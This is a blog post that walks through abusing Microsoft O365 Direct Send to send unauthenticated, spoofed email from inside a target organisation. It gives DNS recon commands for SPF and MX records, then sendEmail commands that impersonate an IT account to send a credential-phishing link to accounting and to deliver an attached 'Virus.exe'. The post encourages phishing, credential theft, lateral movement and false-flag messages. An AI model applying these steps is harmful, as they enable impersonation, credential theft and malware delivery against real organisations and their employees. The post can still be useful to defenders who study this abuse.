
## MoreBitCuriosity Presents 
### O365 Direct Send Exploitations 

Microsoft O365 has offered the direct send functionality as a work around for devices without SSL/TLS abilities from within your network. MS details on the various set ups for multifunction devices can be found [HERE](https://support.office.com/en-us/article/How-to-set-up-a-multifunction-device-or-application-to-send-email-using-Office-365-69f58e99-c550-4274-ad18-c805d654b4c4)  

# Let's take a look 
Here are the juicy bits of the Direct Send directions: 

- You can configure your device to send email direct to Office 365. Use direct send to relay email to recipients with Office 365 mailboxes in your organization. 

# It's coming from inside the house...  
O365 has a 'functionality' that allows any device to bypass authentication so long as the send comes from a trusted IP space/domain. That is, if you can send from within the SPF listed IP space and the target has O365, you can send unauthenticated mail as an authenticated account (no mailbox required) without a password to any O365 mailbox. No need to try and trick accounting or HR when the email you send comes from the CFO’s actual account. So long as it's sent from within the house your headers will appear 100% legit. 

## Also to note...  

- **_Direct send also works for external recipients with mailboxes in Office 365._** If your device uses direct send to try to relay an email for a recipient who doesn’t have an Office 365 mailbox, the email will be rejected. 

## Reading between the lines 
If YOU have access to any O365, you can send to any other O365 direct, as anything/anyone with no auth required. I can sit here and use an O365 SPF, the listed MX server, and send an email as anyone, to any O365 domain just like any smtp server I stood up myself, without any of the trouble of setting it up. Or I can send a 'PDF attachment' as a printer account to Accounts Payable... I have full SMTP ability out of box! There are some limitations to the number of emails you can send so it's not great for a wide net, but it's usable. However, the real shining star is the Direct Send intra-domain abilities.  

### Awesome 

# Let's Jump in 
All we need is some SPF and MX records. Pick a target domain: We'll BS the details for the blog and use MoreBitCuriosity.com as the test domain, & call the IP space 209.166.111.110/28

# Recon time 
``` 
~$ `nslookup -type=txt MoreBitCuriosity.com` 
_Server:  208.67.222.222 
Address: 208.67.222.222#53 

Non-authoritative answer: 
MoreBitCuriosity.com text = "google-site-verification=(Fancy numbers)" 
MoreBitCuriosity.com text = **"v=spf1 ip4:209.166.111.110 ip4:209.166.111.110/28** 
a mx include:spf.protection.outlook.com include:spf.ThirdpartyThings.com  
include:servers.mcsv.net include:esp1.co include:ThirdPartyThatMarketing"HadToHave".com -all" 
MoreBitCuriosity.com text = "v=verifydomain MS=msHouse" 
MoreBitCuriosity.com text = "google-site-verification=MoreFanciness" 

Authoritative answers can be found from:_ 
``` 
_Side note: SPF is a good way to hunt down public IP's for heavily hosted or sharded companies. Somewhere you are going to have grounding points, and there's typically an SPF for them. Remote offices teleworkers if no VPN set up so on so forth._ 

# SPF Obtained 
So we know where we need to be sitting, now the most important part, is knowing where the mx lives and sends from. Grabbing the MX record will give us the details we need: 
``` 
~$ `nslookup -type=mx MoreBitCuriosity.com`  
_Server:  208.67.222.222 
Address: 208.67.222.222#53 

Non-authoritative answer: 
MoreBitCuriosity.com mail exchanger = 0 **MoreBitCuriosity-com.mail.protection.outlook.com.** 

Authoritative answers can be found from:_ 
``` 
# Now just send all the mail! 
Truth be told the O365 MX records are pretty standard nowadays, and knowing the domain you can usually 'feel/guess' your way to the correct server. But when the information is public and this easy to get to, it's a wash. The SPF will tell you where you need to come from if you don't have an O365 account yourself, the MX record will be your send/server address, because it's a SSL/TLS bypass you just use Port 25. 

## That's it Start hacking 
Once you are inside your target, simply throw the info you gathered into sendEmail or Telnet (or what evs your flavor is) to the MX record and port (standard 25), and away you go! 

``` 
~$ sendEmail -f "Probably the IT Folks@MoreBitCuriosity.com" -t Accounting@MoreBitCuriosity.com  
-u "Here's the link we talked about" -s MoreBitCuriosity-com.mail.protection.outlook.com -m  
Reading message body from STDIN because the '-m' option was not used. 
If you are manually typing in a message: 
  - First line must be received within 60 seconds. 
  - End manual input with a CTRL-D on its own line. 


Hey John,  
Here is the link that we talked about:  
https://CustomWrittenPageForCredPhishingOrWhatEvs.com 

Thanks! 

Your IT Person  
Jul 14 00:11:37 kali sendEmail[8585]: Message input complete. 
Jul 14 00:11:39 kali sendEmail[8585]: Email was sent successfully! 
``` 
# No Really, that's it! 
It really is that simple. You just kinda bypass most of the O365 filter and send all the mail you want. The intra-Domain direct send is, again, the real jewel here, if you are so inclined you can use direct send as a typical smtp spoof. Hell you can use direct send from your own O365 account course there's some OpSec issues there, so use at your own risk... Or set the Starbucks down the road as a valid -all SPF for yourself for a couple hours and change your hostname to a O365 sounding bit of jazz... 

### Considerations 
You will still be subject to some backend scans. Meaning you can't send known crap links that pop positive on virus total already, or expect .bat or .exe payloads with names like MmalwareFlavorOfTheWeek to surf on through cross domain, or intra-domain. BUT! If the target doesn't have internal checks for attachments, i.e. ‘only checks attachments external to internal’, then you can pass pretty much anything, payloads as obvious as you want. E.g.:  
``` 
~$ sendEmail -t UserFace@MoreBitCuriosity.com -f "The_Man@MoreBitCuriosity.com"  
-u "this is not a drill son!" -a '/home/NotAHacker/Desktop/Virus.exe'  
-s MoreBitCuriosity-com.mail.protection.outlook.com -m  
Reading message body from STDIN because the '-m' option was not used. 
If you are manually typing in a message: 
  - First line must be received within 60 seconds. 
  - End manual input with a CTRL-D on its own line. 

You have no chance to survive, make your time. 

Jul 14 08:54:40 kali sendEmail[14276]: Message input complete. 
Jul 14 08:54:43 kali sendEmail[14276]: Email was sent successfully! 
``` 
### Further Considerations 
The outlook application will strip some things that are obvious, as always, and third party AV will as well, if its addon is enabled to outlook. OWA will help to mask some of the dirty payloads, and will be a helper in cred snatching as well. 

## Wrap up 
While more of exploit to get your foot moving around once it's already in the door on an O365 target, it's still a fantastic way to cloakup as you are sending verified messages as the sender of choice from within the O365 domain. Those O365 contact cards and colored status indicators really build confidence through repetition. With an inside like this it's a good tool to laterally move, drop false flags, fish creds, force credential changes because 'my account is sending weird emails' ('cause you are monitoring the those accounts, right?), act as a system or service account cause some misdirection. You guys get the idea, sky's the limit. Go have some fun.   

## Thanks for reading! 

# Special Thanks 
For all the emails, tests, and editorial help. 

Matt Brenton [@MuchGrok](https://twitter.com/muchgrok) 

Matt DePaepe [@Mattdep_](https://twitter.com/mattdep_) 

### Catch me on twitter too  
And Thanks again! [Zach Zaffis](https://twitter.com/ZuluAlphaFoxTwo) 
